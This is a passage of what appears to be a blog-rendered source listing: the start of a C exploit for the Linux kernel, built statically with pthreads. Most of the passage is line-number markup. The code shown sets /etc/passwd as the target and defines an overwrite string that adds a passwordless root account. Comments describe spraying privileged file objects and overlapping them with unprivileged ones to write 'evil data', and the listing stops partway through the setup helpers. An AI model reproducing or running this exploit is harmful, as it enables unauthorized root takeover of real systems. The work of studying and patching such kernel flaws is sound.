class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $ gcc -static -pthread -O0 ./exploit.c -o ./exploit</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;endian.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if_arp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tc_ematch/tc_em_meta.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/capability.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/futex.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/genetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_addr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_link.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_tun.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in6.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kcmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/neighbour.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pkt_cls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pkt_sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/rtnetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/veth.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* target = <span class="string">&quot;/etc/passwd&quot;</span>;                   <span class="comment">// overwrite the target file</span></span><br><span class="line"><span class="keyword">char</span>* overwrite = <span class="string">&quot;hi:x:0:0:root:/:/bin/sh\n&quot;</span>;  <span class="comment">// &quot;user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash\n&quot;</span></span><br><span class="line"><span class="keyword">char</span>* global;</span><br><span class="line"><span class="keyword">char</span>* self_path;</span><br><span class="line"><span class="keyword">char</span>* content;                                  <span class="comment">// evil data + existing data in the target file</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FILE_NUM 0x8000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fds[MAX_FILE_NUM] = &#123;&#125;;</span><br><span class="line"><span class="keyword">int</span> fd_2[MAX_FILE_NUM] = &#123;&#125;;</span><br><span class="line"><span class="keyword">int</span> overlap_a = <span class="number">-1</span>;     <span class="comment">// unprivileged `file`</span></span><br><span class="line"><span class="keyword">int</span> overlap_b = <span class="number">-1</span>;     <span class="comment">// privileged `file`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> cpu_cores = <span class="number">0</span>;      <span class="comment">// num of cpu cores</span></span><br><span class="line"><span class="keyword">int</span> sockfd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> spray_num_1 = <span class="number">2000</span>; <span class="comment">// 4000</span></span><br><span class="line"><span class="keyword">int</span> spray_num_2 = <span class="number">4000</span>; <span class="comment">// 5000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pipe_main[<span class="number">2</span>];       <span class="comment">// notify process to excecute using pipe</span></span><br><span class="line"><span class="keyword">int</span> pipe_parent[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_child[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_defrag[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_file_spray[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> run_write = <span class="number">0</span>;      <span class="comment">// let thread 2 begin to write evil data</span></span><br><span class="line"><span class="keyword">int</span> run_spray = <span class="number">0</span>;      <span class="comment">// let thread 3 begin to spray privileged `file`</span></span><br><span class="line"><span class="keyword">bool</span> overlapped = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span>* buf, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span>*)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// set cpu affinity</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pin_on_cpu</span><span class="params">(<span class="keyword">int</span> cpu)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(cpu, &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;sched_setaffinity()&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">write_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* file, <span class="keyword">const</span> <span class="keyword">char</span>* what, ...)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    va_list args;</span><br><span class="line">    va_start(args, what);</span><br><span class="line">    vsnprintf(buf, <span class="keyword">sizeof</span>(buf), what, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    buf[<span class="keyword">sizeof</span>(buf) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">int</span> fd = open(file, O_WRONLY | O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (write(fd, buf, len) != len) &#123;</span><br><span class="line">        <span class="keyword">int</span> err = errno;</span><br><span class="line">        close(fd);</span><br><span class="line">        errno = err;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// setup working dir</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">use_temporary_dir</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;touch exp_dir/data2&quot;</span>);</span><br><span class="line">    